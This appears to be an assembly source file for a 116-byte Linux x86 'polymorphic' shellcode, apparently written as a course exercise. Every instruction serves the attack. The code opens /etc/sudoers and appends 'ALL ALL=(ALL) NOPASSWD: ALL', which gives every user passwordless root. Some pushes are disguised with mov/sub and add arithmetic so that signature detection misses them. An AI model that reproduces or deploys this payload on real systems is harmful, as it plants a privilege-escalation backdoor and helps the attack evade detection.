; Title: edit "/etc/sudoers" Polymorphic Shellcode - 116 byte
; Platform: linux/x86
; Date: 2015-01-18
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721
;
; The orignal shellcode is implemented by:
; Rick <rick2600@hotmail.com>

BITS 32

global _start
section .text

_start:
	; edit "/etc/sudoers" for full access - 116 byte

open:
	;open("/etc/sudoers", O_WRONLY | O_APPEND);

	; the orginal version:
	; xor eax, eax
	mov ebx, eax                   ; mov eax to ebx
	xor eax, ebx                   ; clean eax
	push eax                       ; push eax
	mov DWORD [esp-4], 0x7372656f  ; obfuscated version of:
	sub esp, 0x4                   ; push 0x7372656f
	mov DWORD [esp-4], 0x6475732f  ; obfuscated version of:
	sub esp, 0x4                   ; push 0x6475732f
	mov DWORD [esp-4], 0x6374652f  ; obfuscated version of:
	sub esp, 0x4                   ; push 0x6374652f
	mov ebx, esp                   ; save pointer to ebx
	mov ecx, 0x401                 ; O_WRONLY | O_APPEN = 0x401
	mov al, 0x05                   ; syscall 0x05 -> open()
	int 0x80                       ; syscall open()

	; the orginal version:
	; mov ebx, eax
	xchg ebx, eax                  ; save fd to ebx

write:
	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);

	xor eax, eax                   ; clean eax
	push eax                       ; push eax
	push 0x0a4c4c41                ; '\nLLA'
	push 0x203a4457                ; ' :DW'
	mov esi, 0x1fd0dc3d            ; obfuscated version of:
	add esi, 0x33826513            ; push 0x53534150
	push esi                       ; push esi
	push 0x4f4e2029                ; 'ON )'
	push 0x4c4c4128                ; 'LLA('
	push 0x3d4c4c41                ; '=LLA'
	push 0x204c4c41                ; ' LLA'
	mov ecx, esp                   ; save pointer to ecx
	mov edx, 0x1c                  ; edx = 0x1c = 28 byte
	mov al, 0x04                   ; syscall 0x04 -> write()
	int 0x80                       ; syscall write()

close:
	;close(file)

	mov al, 0x06                   ; syscall 0x06 -> close()
	int 0x80                       ; syscall close()

exit:
	;exit(0);

	xor ebx, ebx                   ; clean ebx
	mov al, 0x01                   ; syscall 0x1 -> exit()
	int 0x80                       ; syscall exit()
